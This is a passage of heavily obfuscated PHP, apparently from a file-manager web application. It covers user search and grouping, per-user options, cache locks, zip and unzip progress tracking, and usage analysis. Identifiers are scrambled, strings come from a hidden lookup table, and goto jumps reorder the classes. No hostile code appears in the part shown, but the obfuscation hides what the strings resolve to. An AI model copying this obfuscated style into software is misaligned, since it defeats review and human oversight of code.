array($³·Âú›ª[470], "{$¢ƒİø÷±}\x25"), $³·Âú›ª[1072] => $³·Âú›ª[2080]); if (Input::check($¢ƒİø÷±, $³·Âú›ª[397])) { $¨£ôÄÊÈ[$³·Âú›ª[1777]] = array($³·Âú›ª[470], "{$¢ƒİø÷±}\45"); $¨£ôÄÊÈ[$³·Âú›ª[2498]] = array($³·Âú›ª[470], "{$¢ƒİø÷±}\45"); } if (!$¢ƒİø÷±) { $¨£ôÄÊÈ = array(); } if (isset($à·¸©¢¿[$³·Âú›ª[815]])) { $¨£ôÄÊÈ[$³·Âú›ª[815]] = $à·¸©¢¿[$³·Âú›ª[815]]; } $¨£ôÄÊÈ = $this->parseWhereLike($¨£ôÄÊÈ); $Ô‰¯‚µ = $this->_makeOrder()->where($¨£ôÄÊÈ)->selectPage(20); if (!$Ô‰¯‚µ || count($Ô‰¯‚µ[$³·Âú›ª[456]]) < 5 && Input::check($¢ƒİø÷±, $³·Âú›ª[404])) { $ö•§¾¤ï = $this->_searchFromMeta($³·Âú›ª[548], $¢ƒİø÷±, 10); $õö·Å‘‚ = $this->_searchFromMeta($³·Âú›ª[549], $¢ƒİø÷±, 10); $¿ç²òá¢ = array_merge($ö•§¾¤ï, $õö·Å‘‚, $Ô‰¯‚µ[$³·Âú›ª[456]]); $Ô‰¯‚µ[$³·Âú›ª[456]] = array_unique_by_key($¿ç²òá¢, $³·Âú›ª[1777]); $Ô‰¯‚µ[$³·Âú›ª[453]][$³·Âú›ª[454]] = count($Ô‰¯‚µ[$³·Âú›ª[456]]); $Ô‰¯‚µ[$³·Âú›ª[453]][$³·Âú›ª[455]] = ceil($Ô‰¯‚µ[$³·Âú›ª[453]][$³·Âú›ª[454]] / $Ô‰¯‚µ[$³·Âú›ª[453]][$³·Âú›ª[450]]); } $this->_listDataApply($Ô‰¯‚µ[$³·Âú›ª[456]]); $this->_filterByGroup($Ô‰¯‚µ, $€æ¿); return $Ô‰¯‚µ; } private function _filterByGroup(&$¶®ˆ¦®„, $ÀÊ¾ßØİ) { $Âƒâ€—ë =& $_SERVER[äô®•½Â]; if (!$ÀÊ¾ßØİ) { return $¶®ˆ¦®„; } foreach ($¶®ˆ¦®„[$Âƒâ€—ë[456]] as $º¸ØÎ±­ => &$µŸ¡Ê) { $ œâòı¶ = array_to_keyvalue($µŸ¡Ê[$Âƒâ€—ë[1387]], $Âƒâ€—ë[12], $Âƒâ€—ë[1388]); if (!in_array($ÀÊ¾ßØİ, $ œâòı¶)) { unset($¶®ˆ¦®„[$Âƒâ€—ë[456]][$º¸ØÎ±­]); } } unset($µŸ¡Ê); $¶®ˆ¦®„[$Âƒâ€—ë[456]] = array_values($¶®ˆ¦®„[$Âƒâ€—ë[456]]); $¶®ˆ¦®„[$Âƒâ€—ë[453]] = array($Âƒâ€—ë[2241] => count($¶®ˆ¦®„[$Âƒâ€—ë[456]]), $Âƒâ€—ë[2239] => $¶®ˆ¦®„[$Âƒâ€—ë[453]][$Âƒâ€—ë[450]], $Âƒâ€—ë[2238] => 1, $Âƒâ€—ë[2240] => 1); } private function _searchFromMeta($µæ¼ôãÁ, $€×†Û—°, $¶ß²Ö–) { $‹Éá÷”Ğ =& $_SERVER[äô®•½Â]; $€×†Û—° = strtolower($€×†Û—°); $Ñ‚Öµ¶ = array($‹Éá÷”Ğ[97] => $µæ¼ôãÁ, $‹Éá÷”Ğ[461] => array($‹Éá÷”Ğ[470], "\x25{$€×†Û—°}\x25")); $Ñ‚Öµ¶ = $this->parseWhereLike($Ñ‚Öµ¶); $½Ë×‰î = Model($‹Éá÷”Ğ[2519])->where($Ñ‚Öµ¶)->limit($¶ß²Ö–)->select(); if (!$½Ë×‰î) { return array(); } $½Ë×‰î = array_to_keyvalue($½Ë×‰î, $‹Éá÷”Ğ[12], $‹Éá÷”Ğ[1777]); $Ò¶²Í— = $this->where(array($‹Éá÷”Ğ[1768] => array($‹Éá÷”Ğ[7], $½Ë×‰î)))->select(); if (!$Ò¶²Í—) { return array(); } return $Ò¶²Í—; } private function _listDataApplyItem($²¼ÙÊå) { $çş¥áÁë = array($²¼ÙÊå); $this->_listDataApply($çş¥áÁë); return $çş¥áÁë[0]; } private function _listDataApply(&$ùÊÚ¹û‡) { $Ş§ãÛù =& $_SERVER[äô®•½Â]; if (!$ùÊÚ¹û‡) { return; } array_remove_key($ùÊÚ¹û‡, $Ş§ãÛù[961]); $¸ÉÔ°Â„ = array_to_keyvalue($ùÊÚ¹û‡, $Ş§ãÛù[12], $Ş§ãÛù[1777]); $this->_listAppendGroup($ùÊÚ¹û‡, $¸ÉÔ°Â„); $this->_listAppendMeta($ùÊÚ¹û‡, $¸ÉÔ°Â„); $this->_listAppendSourceRoot($ùÊÚ¹û‡, $¸ÉÔ°Â„); } private function _listAppendSourceRoot(&$ü¦Ûì¾É, $¦ÄáÒ³í) { $®‡£×‚á =& $_SERVER[äô®•½Â]; $Ş¬¶‘Ä = Model($®‡£×‚á[896])->listSourceRoot(SourceModel::TYPE_USER, $¦ÄáÒ³í); $Ş¬¶‘Ä = array_to_keyvalue($Ş¬¶‘Ä, $®‡£×‚á[582]); $Ş¬¶‘Ä = array_remove_key($Ş¬¶‘Ä, $®‡£×‚á[582]); foreach ($ü¦Ûì¾É as &$èœ·ÖÈ“) { $èœ·ÖÈ“[$®‡£×‚á[90]] = $Ş¬¶‘Ä[$èœ·ÖÈ“[$®‡£×‚á[1777]]] ? $Ş¬¶‘Ä[$èœ·ÖÈ“[$®‡£×‚á[1777]]] : array(); } unset($èœ·ÖÈ“); } private function _listAppendGroup(&$®Äó“ŠÜ, $ß‚°ÁŒû) { $Ï±ùŞ“Œ =& $_SERVER[äô®•½Â]; $É…·°ë = array($Ï±ùŞ“Œ[1777] => array($Ï±ùŞ“Œ[7], $ß‚°ÁŒû)); $ª¤•—°š = Model($Ï±ùŞ“Œ[2072])->where($É…·°ë)->select(); $Ş¹Ì¤ª = array_to_keyvalue($ª¤•—°š, $Ï±ùŞ“Œ[12], $Ï±ùŞ“Œ[1388]); $Ş¹Ì¤ª = array_remove_value(array_unique($Ş¹Ì¤ª), $Ï±ùŞ“Œ[231]); if (!$Ş¹Ì¤ª || !$ª¤•—°š) { return; } $É…·°ë = array($Ï±ùŞ“Œ[1388] => array($Ï±ùŞ“Œ[7], $Ş¹Ì¤ª)); $îú÷… = Model($Ï±ùŞ“Œ[1386])->field($Ï±ùŞ“Œ[2520])->where($É…·°ë)->select(); $îú÷… = array_to_keyvalue($îú÷…, $Ï±ùŞ“Œ[1388]); $ª¤•—°š = array_to_keyvalue_group($ª¤•—°š, $Ï±ùŞ“Œ[1777]); foreach ($ª¤•—°š as &$Öë¤¹ö) { $«Ä¥†îş = array(); foreach ($Öë¤¹ö as $±­Æ„êù) { if (!$±­Æ„êù[$Ï±ùŞ“Œ[2086]]) { continue; } $Ñ¬ú¡Ï = Model($Ï±ùŞ“Œ[584])->listData($±­Æ„êù[$Ï±ùŞ“Œ[2086]]); $«Ä¥†îş[] = array($Ï±ùŞ“Œ[1388] => $±­Æ„êù[$Ï±ùŞ“Œ[1388]], $Ï±ùŞ“Œ[2521] => $îú÷…[$±­Æ„êù[$Ï±ùŞ“Œ[1388]]][$Ï±ùŞ“Œ[32]], $Ï±ùŞ“Œ[597] => $îú÷…[$±­Æ„êù[$Ï±ùŞ“Œ[1388]]][$Ï±ùŞ“Œ[597]], $Ï±ùŞ“Œ[498] => $Ñ¬ú¡Ï); } $Öë¤¹ö = $«Ä¥†îş; } unset($Öë¤¹ö); foreach ($®Äó“ŠÜ as &$ì×âÂ‡û) { $ì×âÂ‡û[$Ï±ùŞ“Œ[1387]] = array(); if (isset($ª¤•—°š[$ì×âÂ‡û[$Ï±ùŞ“Œ[1777]]])) { $ì×âÂ‡û[$Ï±ùŞ“Œ[1387]] = $ª¤•—°š[$ì×âÂ‡û[$Ï±ùŞ“Œ[1777]]]; } } unset($ì×âÂ‡û); } public function userAppendGroup($ÇõèÂÊ) { $”êŞ·†ô =& $_SERVER[äô®•½Â]; if (!$ÇõèÂÊ) { return array(); } $this->_listAppendGroup($ÇõèÂÊ, array_to_keyvalue($ÇõèÂÊ, $”êŞ·†ô[12], $”êŞ·†ô[1777])); return $ÇõèÂÊ; } private function _listAppendMeta(&$ãê‹˜àƒ, $õ“¦³‹©) { $‘—³ã‹ =& $_SERVER[äô®•½Â]; $Îæ¢˜¶¹ = UserJobModel::JOB_KEY; $È÷–‡›» = array($‘—³ã‹[2070]); $÷ï—Ö÷‰ = array($‘—³ã‹[1777] => array($‘—³ã‹[7], $õ“¦³‹©)); $Æ‹îÉ×• = Model($‘—³ã‹[2497])->where($÷ï—Ö÷‰)->select(); $óŸÑ¨•© = array(); foreach ($Æ‹îÉ×• as $ÅŸ¸¹¡) { $®¦œÂåÏ = $ÅŸ¸¹¡[$‘—³ã‹[1777]]; if (!isset($óŸÑ¨•©[$®¦œÂåÏ])) { $óŸÑ¨•©[$®¦œÂåÏ] = array(); } $óŸÑ¨•©[$®¦œÂåÏ][$ÅŸ¸¹¡[$‘—³ã‹[97]]] = $ÅŸ¸¹¡[$‘—³ã‹[461]]; } $áÕÄåœĞ = Model($‘—³ã‹[2522]); foreach ($ãê‹˜àƒ as &$ÃŸ¸ –€) { $®¦œÂåÏ = $ÃŸ¸ –€[$‘—³ã‹[1777]]; $×ª—Œ¸Ä = isset($óŸÑ¨•©[$®¦œÂåÏ]) ? $óŸÑ¨•©[$®¦œÂåÏ] : array(); $ÃŸ¸ –€[$‘—³ã‹[552]] = array_field_key($×ª—Œ¸Ä, $È÷–‡›»); $ÃŸ¸ –€[$‘—³ã‹[2523]] = array(); if (isset($×ª—Œ¸Ä[$Îæ¢˜¶¹])) { $ÃŸ¸ –€[$‘—³ã‹[2523]] = $áÕÄåœĞ->getUserJobInfo($×ª—Œ¸Ä[$Îæ¢˜¶¹]); } } unset($ÃŸ¸ –€); } protected function groupUserAll($øÏªçò) { $ØÕšÓÎ =& $_SERVER[äô®•½Â]; if (!$øÏªçò) { return !1; } $å¦¨’‘ = Model($ØÕšÓÎ[2072])->field($ØÕšÓÎ[1777])->where(array($ØÕšÓÎ[1388] => array($ØÕšÓÎ[7], $øÏªçò)))->select(); $å¦¨’‘ = array_to_keyvalue($å¦¨’‘, $ØÕšÓÎ[12], $ØÕšÓÎ[1777]); return array_unique($å¦¨’‘); } public function userSearch($ƒıÑ³º­, $‰å¹†ò = "\x2a") { return Model($_SERVER[äô®•½Â][610])->where($ƒıÑ³º­)->field($‰å¹†ò)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\137\157\160\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($íÄØÏç¬) { $¦ÆÙ¶—Ç =& $_SERVER[äô®•½Â]; $„Ç†âËì = defined($¦ÆÙ¶—Ç[2208]) && USER_ID ? USER_ID : $¦ÆÙ¶—Ç[12]; return "\125\163\x65\162\117\160\164\x69\x6f\x6e\x5f{$íÄØÏç¬}\x5f" . $„Ç†âËì; } protected function filterWhere($Âò‰»ÉÍ) { $”Ò•áÎ =& $_SERVER[äô®•½Â]; $Âò‰»ÉÍ[$”Ò•áÎ[1777]] = defined($”Ò•áÎ[2208]) && USER_ID ? USER_ID : $”Ò•áÎ[12]; return $Âò‰»ÉÍ; } public function cacheRemoveUser($ã–Êê, $ÉÁñì‘­) { return Cache::remove("\125\163\145\x72\x4f\x70\x74\151\x6f\x6e\137{$ã–Êê}\x5f" . $ÉÁñì‘­); } protected function optionDefault($‡½©áµó = '') { $¥Øİ½¬à =& $_SERVER[äô®•½Â]; if ($‡½©áµó == $¥Øİ½¬à[12]) { return $GLOBALS[$¥Øİ½¬à[6]][$¥Øİ½¬à[2524]]; } if ($‡½©áµó == $¥Øİ½¬à[2525]) { return $GLOBALS[$¥Øİ½¬à[6]][$¥Øİ½¬à[2526]]; } } } goto F¬­ÏØ×®; Aå†é’¨ğÅ: class CacheLockRedis { public function lock($ˆ½­î, $É¡ë•œÒ = 10) { $Å’ø†î = Cache::init(); $·ôßÙ¾” = microtime(!0) + $É¡ë•œÒ; while (microtime(!0) < $·ôßÙ¾”) { $°Ø„úòà = $Å’ø†î->get($ˆ½­î); if (!$°Ø„úòà) { $Êæ¦Ú¬¢ = $Å’ø†î->setLock($ˆ½­î, $·ôßÙ¾”, $É¡ë•œÒ); if ($Êæ¦Ú¬¢) { return !0; } } else { if ($°Ø„úòà < microtime(!0)) { $Å’ø†î->set($ˆ½­î, $·ôßÙ¾”, $É¡ë•œÒ * 2); if ($Å’ø†î->get($ˆ½­î) === $°Ø„úòà) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($˜òı¤Üà) { return Cache::init()->get($˜òı¤Üà); } public function unlock($¿ÛŠÁ˜) { return Cache::init()->remove($¿ÛŠÁ˜); } } class CacheLockMemcached { public function lock($»”Ü¡Æ, $üßÛûÅÒ = 0) { $ÕİĞŸÍê = Cache::init(); $ªÃ¥ÍÍ = microtime(!0) + $üßÛûÅÒ; while (microtime(!0) < $ªÃ¥ÍÍ) { $ã˜Óš = $ÕİĞŸÍê->get($»”Ü¡Æ); if (!$ã˜Óš || $ã˜Óš < microtime(!0)) { $„ëéø¾ = $ÕİĞŸÍê->handle->add($»”Ü¡Æ, $ªÃ¥ÍÍ, $üßÛûÅÒ); if ($„ëéø¾) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ë¡àïš¶) { return Cache::init()->get($ë¡àïš¶); } public function unlock($üº´õûÍ) { return Cache::init()->remove($üº´õûÍ); } } class CacheLockDatabase { public function lock($ß·ıïÄÎ, $Á¦ÙÃè’ = 0) { $ÙĞë±Ë‹ = Model($_SERVER[äô®•½Â][900]); $ôî¤« = microtime(!0) + $Á¦ÙÃè’; while (microtime(!0) < $ôî¤«) { $™ş€ç¾¨ = $ÙĞë±Ë‹->get($ß·ıïÄÎ); if (!$™ş€ç¾¨ || $™ş€ç¾¨ < microtime(!0)) { $¶Šã²Í‘ = $ÙĞë±Ë‹->set($ß·ıïÄÎ, $ôî¤«); if ($¶Šã²Í‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ëÑƒ‘Š”) { return Model($_SERVER[äô®•½Â][900])->get($ëÑƒ‘Š”); } public function unlock($ºšª±Ô¤) { Model($_SERVER[äô®•½Â][900])->remove($ºšª±Ô¤); } } goto fÏÒ×Í»¼å; b¸à‹”Ìòì: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ş÷üâÒ =& $_SERVER[äô®•½Â]; parent::startAfter(); Hook::bind($Ş÷üâÒ[1893], array($this, $Ş÷üâÒ[1894])); Hook::bind($Ş÷üâÒ[1276], array($this, $Ş÷üâÒ[1895])); Hook::bind($Ş÷üâÒ[1896], array($this, $Ş÷üâÒ[1897])); $‘±‡ö³È =& $this->task; $‘±‡ö³È[$Ş÷üâÒ[1898]] = $Ş÷üâÒ[1277]; if (!$‘±‡ö³È[$Ş÷üâÒ[1664]]) { $‘±‡ö³È[$Ş÷üâÒ[1664]] = LNG($Ş÷üâÒ[1899]); } } protected function endAfter() { $å˜Ú–Ñ‹ =& $_SERVER[äô®•½Â]; parent::endAfter(); Hook::unbind($å˜Ú–Ñ‹[1893], array($this, $å˜Ú–Ñ‹[1894])); Hook::unbind($å˜Ú–Ñ‹[1276], array($this, $å˜Ú–Ñ‹[1895])); Hook::unbind($å˜Ú–Ñ‹[1896], array($this, $å˜Ú–Ñ‹[1897])); } public function updateAfter() { $¡Œº¢¬ =& $_SERVER[äô®•½Â]; $Š³òÔì„ =& $this->task; if (!$Š³òÔì„[$¡Œº¢¬[1135]] || !$Š³òÔì„[$¡Œº¢¬[829]]) { if ($Š³òÔì„[$¡Œº¢¬[1898]] != $¡Œº¢¬[399]) { return; } } if ($Š³òÔì„[$¡Œº¢¬[1898]] == $¡Œº¢¬[1277]) { $‡ÂÖóæï = 0; if ($Š³òÔì„[$¡Œº¢¬[1831]]) { $‡ÂÖóæï = $Š³òÔì„[$¡Œº¢¬[1832]] / $Š³òÔì„[$¡Œº¢¬[1831]]; } $Š³òÔì„[$¡Œº¢¬[1779]] = $‡ÂÖóæï * 0.3; } else { if ($Š³òÔì„[$¡Œº¢¬[1898]] == $¡Œº¢¬[399]) { $‡ÂÖóæï = $Š³òÔì„[$¡Œº¢¬[1778]] / $Š³òÔì„[$¡Œº¢¬[1135]]; $Š³òÔì„[$¡Œº¢¬[1779]] = 0.3 + $‡ÂÖóæï * 0.4; } else { if ($Š³òÔì„[$¡Œº¢¬[1898]] == $¡Œº¢¬[110]) { $õåñ£ÃÆ = 0; if ($Š³òÔì„[$¡Œº¢¬[1833]] == $¡Œº¢¬[110]) { $õåñ£ÃÆ = $Š³òÔì„[$¡Œº¢¬[1832]]; } $‡ÂÖóæï = ($Š³òÔì„[$¡Œº¢¬[1836]] + $õåñ£ÃÆ) / $Š³òÔì„[$¡Œº¢¬[829]]; $Š³òÔì„[$¡Œº¢¬[1779]] = 0.3 + 0.4 + $‡ÂÖóæï * 0.3; } } } if ($Š³òÔì„[$¡Œº¢¬[1779]] > 0) { $¡ÕÔâø€ = timeFloat() - $Š³òÔì„[$¡Œº¢¬[1781]] - $Š³òÔì„[$¡Œº¢¬[1784]]; $Š³òÔì„[$¡Œº¢¬[1785]] = $¡ÕÔâø€ * (1 - $Š³òÔì„[$¡Œº¢¬[1779]]) / $Š³òÔì„[$¡Œº¢¬[1779]]; } } public function addFile($Œ—ˆœ–›) { $ãñ’¡ü¬ =& $_SERVER[äô®•½Â]; $õªüšÏ² =& $this->task; $ú©Öş“Æ = IO::info($Œ—ˆœ–›); $õªüšÏ²[$ãñ’¡ü¬[1829]] = $ú©Öş“Æ[$ãñ’¡ü¬[32]]; $õªüšÏ²[$ãñ’¡ü¬[1831]] = $ú©Öş“Æ[$ãñ’¡ü¬[79]]; $õªüšÏ²[$ãñ’¡ü¬[1832]] = 0; $õªüšÏ²[$ãñ’¡ü¬[1137]] = $ãñ’¡ü¬[1852]; $õªüšÏ²[$ãñ’¡ü¬[1833]] = $ãñ’¡ü¬[1277]; $õªüšÏ²[$ãñ’¡ü¬[829]] = $ú©Öş“Æ[$ãñ’¡ü¬[79]]; $õªüšÏ²[$ãñ’¡ü¬[1135]] = 1; $“œ‹ïô = 0; $õªüšÏ²[$ãñ’¡ü¬[1840]] = array($ãñ’¡ü¬[1841] => $“œ‹ïô + 1, $ãñ’¡ü¬[505] => $ú©Öş“Æ[$ãñ’¡ü¬[32]], $ãñ’¡ü¬[87] => $ú©Öş“Æ[$ãñ’¡ü¬[87]], $ãñ’¡ü¬[595] => $ú©Öş“Æ[$ãñ’¡ü¬[595]] ? $ú©Öş“Æ[$ãñ’¡ü¬[595]] : $ú©Öş“Æ[$ãñ’¡ü¬[87]]); $this->update(); } public function zipEvent($İÙ¿Èıµ, $ê·•²é¡, $õ«‡Ç¡Ú, $ä–ß—ãß) { $¢ªÛëÛú =& $_SERVER[äô®•½Â]; $ÉñæºÙ =& $this->task; $ÉñæºÙ[$¢ªÛëÛú[1829]] = get_path_this($ê·•²é¡); $ÉñæºÙ[$¢ªÛëÛú[1831]] = $ä–ß—ãß; $ÉñæºÙ[$¢ªÛëÛú[1832]] = $õ«‡Ç¡Ú; $ÉñæºÙ[$¢ªÛëÛú[1137]] = $İÙ¿Èıµ == $¢ªÛëÛú[1900] ? $¢ªÛëÛú[1901] : $¢ªÛëÛú[1902]; $ÉñæºÙ[$¢ªÛëÛú[1833]] = $¢ªÛëÛú[12]; $ÉñæºÙ[$¢ªÛëÛú[829]] = $ä–ß—ãß; $ÉñæºÙ[$¢ªÛëÛú[1898]] = $¢ªÛëÛú[399]; $this->update(); } public function unzipAfter($…´ñšÊ¤) { $äğÏ® =& $_SERVER[äô®•½Â]; $à…Íîª =& $this->task; $à…Íîª[$äğÏ®[1898]] = $äğÏ®[110]; $ÌÄ÷˜•§ = IO::infoWithChildren($…´ñšÊ¤); $À¾º»± = 0; $à…Íîª[$äğÏ®[1840]] = array($äğÏ®[1841] => $À¾º»± + 1, $äğÏ®[505] => $ÌÄ÷˜•§[$äğÏ®[32]], $äğÏ®[87] => $ÌÄ÷˜•§[$äğÏ®[87]], $äğÏ®[595] => $ÌÄ÷˜•§[$äğÏ®[595]] ? $ÌÄ÷˜•§[$äğÏ®[595]] : $ÌÄ÷˜•§[$äğÏ®[87]]); if ($ÌÄ÷˜•§[$äğÏ®[33]] == $äğÏ®[233]) { $à…Íîª[$äğÏ®[1135]] = 1; } else { $à…Íîª[$äğÏ®[1135]] = $ÌÄ÷˜•§[$äğÏ®[82]][$äğÏ®[80]]; } $à…Íîª[$äğÏ®[1137]] = $äğÏ®[12]; $à…Íîª[$äğÏ®[1833]] = 0; $à…Íîª[$äğÏ®[1778]] = 0; $à…Íîª[$äğÏ®[1831]] = 0; $à…Íîª[$äğÏ®[1832]] = 0; $à…Íîª[$äğÏ®[1829]] = $äğÏ®[12]; $à…Íîª[$äğÏ®[1836]] = 0; $à…Íîª[$äğÏ®[829]] = $ÌÄ÷˜•§[$äğÏ®[79]]; $this->update(); self::log($äğÏ®[1903] . json_encode(array($à…Íîª, $ÌÄ÷˜•§))); } public function nameParse($ö…Û—¹ñ) { $ö•Ö€½Î =& $_SERVER[äô®•½Â]; $”„ôãÉ =& $this->task; if ($”„ôãÉ[$ö•Ö€½Î[1898]] == $ö•Ö€½Î[1277]) { $”„ôãÉ[$ö•Ö€½Î[1898]] = $ö•Ö€½Î[399]; $”„ôãÉ[$ö•Ö€½Î[1836]] = 0; $”„ôãÉ[$ö•Ö€½Î[829]] = 0; } $í‹¸Ì = get_path_this($ö…Û—¹ñ); if (strstr($í‹¸Ì, $ö•Ö€½Î[10])) { $”„ôãÉ[$ö•Ö€½Î[1778]] += 1; $”„ôãÉ[$ö•Ö€½Î[1135]] += 1; } $”„ôãÉ[$ö•Ö€½Î[1829]] = $ö…Û—¹ñ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $  ÑÎŠä =& $_SERVER[äô®•½Â]; parent::startAfter(); Hook::bind($  ÑÎŠä[1904], array($this, $  ÑÎŠä[1894])); Hook::bind($  ÑÎŠä[1896], array($this, $  ÑÎŠä[1897])); $‹û‚½öº =& $this->task; $‹û‚½öº[$  ÑÎŠä[1898]] = $  ÑÎŠä[1277]; if (!$‹û‚½öº[$  ÑÎŠä[1664]]) { $‹û‚½öº[$  ÑÎŠä[1664]] = LNG($  ÑÎŠä[1905]); } } protected function endAfter() { $âı§øßÅ =& $_SERVER[äô®•½Â]; parent::endAfter(); Hook::unbind($âı§øßÅ[1904], array($this, $âı§øßÅ[1894])); Hook::unbind($âı§øßÅ[1896], array($this, $âı§øßÅ[1897])); } public function updateAfter() { $èÛÇç‘ =& $_SERVER[äô®•½Â]; $øšåÉŠİ =& $this->task; if (!$øšåÉŠİ[$èÛÇç‘[1135]] || !$øšåÉŠİ[$èÛÇç‘[829]]) { return; } if ($øšåÉŠİ[$èÛÇç‘[1898]] == $èÛÇç‘[1277]) { $ø§‚´ÉÆ = $øšåÉŠİ[$èÛÇç‘[1832]]; if ($øšåÉŠİ[$èÛÇç‘[1833]] != $èÛÇç‘[1277]) { $ø§‚´ÉÆ = 0; } $è¥ïËç£ = ($øšåÉŠİ[$èÛÇç‘[1836]] + $ø§‚´ÉÆ) / $øšåÉŠİ[$èÛÇç‘[829]]; $øšåÉŠİ[$èÛÇç‘[1779]] = $è¥ïËç£ * 0.3; } else { if ($øšåÉŠİ[$èÛÇç‘[1898]] == $èÛÇç‘[399]) { $è¥ïËç£ = $øšåÉŠİ[$èÛÇç‘[1778]] / $øšåÉŠİ[$èÛÇç‘[1135]]; $øšåÉŠİ[$èÛÇç‘[1779]] = 0.3 + $è¥ïËç£ * 0.5; } else { if ($øšåÉŠİ[$èÛÇç‘[1898]] == $èÛÇç‘[110]) { $è¥ïËç£ = 0; if ($øšåÉŠİ[$èÛÇç‘[1831]]) { $è¥ïËç£ = $øšåÉŠİ[$èÛÇç‘[1832]] / $øšåÉŠİ[$èÛÇç‘[1831]]; } $øšåÉŠİ[$èÛÇç‘[1779]] = 0.3 + 0.5 + $è¥ïËç£ * 0.2; } } } if ($øšåÉŠİ[$èÛÇç‘[1779]] > 0) { $üüøÂŒ½ = timeFloat() - $øšåÉŠİ[$èÛÇç‘[1781]] - $øšåÉŠİ[$èÛÇç‘[1784]]; $øšåÉŠİ[$èÛÇç‘[1785]] = $üüøÂŒ½ * (1 - $øšåÉŠİ[$èÛÇç‘[1779]]) / $øšåÉŠİ[$èÛÇç‘[1779]]; } } public function copyFileStart($¡ÛÜÃ¯û, $ÁšìÛ, $Óğ¤Ø¬˜, $·ÉÜÓ¡, $®šÇæ©¢, $«Êâ¯å™) { $é»®”° =& $_SERVER[äô®•½Â]; parent::copyFileStart($¡ÛÜÃ¯û, $ÁšìÛ, $Óğ¤Ø¬˜, $·ÉÜÓ¡, $®šÇæ©¢, $«Êâ¯å™); $è·ë”‹‹ =& $this->task; if ($è·ë”‹‹[$é»®”°[1898]] == $é»®”°[399]) { $è·ë”‹‹[$é»®”°[1898]] = $é»®”°[110]; } $this->update(); } public function copyFileEnd($¸ÍÄÈ½å, $–éõ¢Õ¢, $Ñ‰¨†åš, $ÈæıÚ˜Û, $ä¤ÍÏ¦Š, $Û‡ÙÚ±å) { $ùÙ±¢Ù =& $_SERVER[äô®•½Â]; $©” àğ§ =& $this->task; $©” àğ§[$ùÙ±¢Ù[1832]] = $©” àğ§[$ùÙ±¢Ù[1831]]; $©” àğ§[$ùÙ±¢Ù[1836]] += $©” àğ§[$ùÙ±¢Ù[1831]]; $©” àğ§[$ùÙ±¢Ù[1833]] = $ùÙ±¢Ù[12]; $this->update(); } public function zipEvent($Ú”¢î·, $úÙÌ÷…¥, $Šû¼ğŞİ, $¹Æî¥ş¯) { $½Ç®æì² =& $_SERVER[äô®•½Â]; $¿ƒ²‡€È =& $this->task; $¿ƒ²‡€È[$½Ç®æì²[1829]] = get_path_this($úÙÌ÷…¥); $¿ƒ²‡€È[$½Ç®æì²[1831]] = $¹Æî¥ş¯; $¿ƒ²‡€È[$½Ç®æì²[1832]] = $Šû¼ğŞİ; $¿ƒ²‡€È[$½Ç®æì²[1137]] = $Ú”¢î· == $½Ç®æì²[1906] ? $½Ç®æì²[1901] : $½Ç®æì²[1902]; $¿ƒ²‡€È[$½Ç®æì²[1833]] = $½Ç®æì²[12]; $¿ƒ²‡€È[$½Ç®æì²[829]] = $¹Æî¥ş¯; $¿ƒ²‡€È[$½Ç®æì²[1898]] = $½Ç®æì²[399]; $this->update(); } public function nameParse($ÙßØÜâÃ) { $—ŒîìôÖ =& $_SERVER[äô®•½Â]; $Éø…Œá =& $this->task; if ($Éø…Œá[$—ŒîìôÖ[1778]] < $Éø…Œá[$—ŒîìôÖ[1135]]) { $´Æë¼£¨ = get_path_this($ÙßØÜâÃ); if (strstr($´Æë¼£¨, $—ŒîìôÖ[10])) { $Éø…Œá[$—ŒîìôÖ[1778]] += 1; } } if ($Éø…Œá[$—ŒîìôÖ[1898]] == $—ŒîìôÖ[1277]) { $Éø…Œá[$—ŒîìôÖ[1898]] = $—ŒîìôÖ[399]; } $Éø…Œá[$—ŒîìôÖ[1829]] = $ÙßØÜâÃ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($©íÔĞíñ) { $¸¶ÏéØİ =& $_SERVER[äô®•½Â]; $·â·³¸ò = array($¸¶ÏéØİ[678] => array($¸¶ÏéØİ[33] => $¸¶ÏéØİ[1907], $¸¶ÏéØİ[362] => array($¸¶ÏéØİ[285], $¸¶ÏéØİ[831], $¸¶ÏéØİ[1908], $¸¶ÏéØİ[1909])), $¸¶ÏéØİ[1910] => array($¸¶ÏéØİ[33] => $¸¶ÏéØİ[1911], $¸¶ÏéØİ[362] => array($¸¶ÏéØİ[285], $¸¶ÏéØİ[829], $¸¶ÏéØİ[1912], $¸¶ÏéØİ[1913], $¸¶ÏéØİ[1914]))); if (!isset($·â·³¸ò[$©íÔĞíñ])) { return !1; } $this->optionType = $·â·³¸ò[$©íÔĞíñ][$¸¶ÏéØİ[33]]; $this->field = $·â·³¸ò[$©íÔĞíñ][$¸¶ÏéØİ[362]]; return !0; } public function listData($úÌ½Ó¾Â = false, $¢‰ÔÅŸï = "\155\x6f\144\x69\x66\171\124\x69\x6d\145", $×©İŒï = false) { return parent::listData($úÌ½Ó¾Â, $¢‰ÔÅŸï, $×©İŒï); } public function trendList($ÖÚòÓùÆ) { $´¼Ù¨£É =& $_SERVER[äô®•½Â]; $ åÀ½¶Ï = $this->listData(); if ($ åÀ½¶Ï) { $¤«¿®¨ = end($ åÀ½¶Ï); $øï—ÅÖÏ = date($´¼Ù¨£É[1915], strtotime($´¼Ù¨£É[1916])); if ($¤«¿®¨[$´¼Ù¨£É[285]] == $øï—ÅÖÏ) { return $ åÀ½¶Ï; } $¢Ú‡Ü¡± = strtotime($¤«¿®¨[$´¼Ù¨£É[285]]); } if (!isset($¢Ú‡Ü¡±)) { $Ş°âìÖĞ = $ÖÚòÓùÆ == $´¼Ù¨£É[678] ? $´¼Ù¨£É[610] : $´¼Ù¨£É[896]; $¢Ú‡Ü¡± = Model($Ş°âìÖĞ)->min($´¼Ù¨£É[234]); } $—‰óšüÁ = $´¼Ù¨£É[1917] . ucfirst($ÖÚòÓùÆ); $³™ı—¸Ä = $this->dateList($¢Ú‡Ü¡±); foreach ($³™ı—¸Ä as $øï—ÅÖÏ) { $this->{$—‰óšüÁ}($øï—ÅÖÏ); } return $this->listData(); } private function dateList($˜¥´ÕŸÂ) { $ÎŞû´Ôİ =& $_SERVER[äô®•½Â]; 